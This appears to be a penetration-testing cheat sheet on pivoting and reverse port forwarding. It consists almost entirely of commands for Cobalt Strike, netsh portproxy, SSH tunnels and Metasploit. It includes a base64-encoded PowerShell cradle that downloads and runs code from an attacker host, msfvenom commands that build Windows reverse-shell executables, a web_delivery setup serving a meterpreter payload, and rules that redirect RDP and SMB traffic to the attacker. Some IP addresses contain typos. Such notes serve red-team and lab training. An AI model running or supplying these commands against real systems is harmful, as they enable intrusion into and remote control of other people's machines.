### Reverse Port Forwarding

### Cobalt Strike

```
socks 1080
proxychains socat TCP4-LISTEN:1344,fork TCP4:x.x.x.x:1344 #Modify proxychains.conf to use 127.0.0.1 on port 1080
```

```
rportfwd 8080 Listener IP 80
PS C:\Users\Commando> $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://192.168.100.111:8080/a')"
PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
```


### Window Reverse Port Forward
```
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=pivotalBox LPORT=2222 -f exe -o Ninja.exe
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.100.11.101 LPORT=2222 -f exe -o Ninja.exe
netsh interface portproxy add v4tov4 listenport=1111 listenaddress=Pivot Box connectport=Kali Port connectaddress=Kali
netsh interface portproxy add v4tov4 listenport=1111 listenaddress=192.168.100.199 connectport=1111 connectaddress=192.168.100.100

```
### Redirect incoming to  Attacker
```
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.100.100
netsh interface portproxy add v4tov4 listenport=445 connectport=443 connectaddress=192.168.100.100 protocol=tcp
netsh interface portproxy add v4tov4 listenport=1443 connectport=443 connectaddress=192.168.100.100 protocol=tcp

```
### Port Forward
```
netsh interface portproxy add v4tov4 listenport=443 listenaddress=192.168.250.10 connectaddress=192.168.250.22 connectport=443
```

### Reverse Port portward Through SSH
```
ssh -R weblogic Port :127.0.0.1:listening on your local Machine Oracle Box Credential@10.11.199.21
ssh -R 7001:127.0.0.1:1337 weblogic@10.11.199.21
```
### Local Port Forwarding
```
ssh -L 7000:10.10.10.128:22 lab@192.168.100.137 -Nf
ssh -L 0.0.0.0:9999:10.10.10.128:80 lab@192.168.100.137 -Nf
ssh lab@127.0.0.1 -p 7000
```
### Metasploit
```
portfwd add -R -p 8080 -L 92.168.100.111 -l 443 or setg Proxies socks4:192.168.100.100:1080
msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 2
msf5 exploit(multi/script/web_delivery) > set SRVHOST 92.168.100.111
msf5 exploit(multi/script/web_delivery) > set SRVPORT 775
msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/bind_tcp
msf5 exploit(multi/script/web_delivery) > set EXITFUNC thread
msf5 exploit(multi/script/web_delivery) > set URIPATH /msf.ps1
msf5 exploit(multi/script/web_delivery) > exploit -j
```
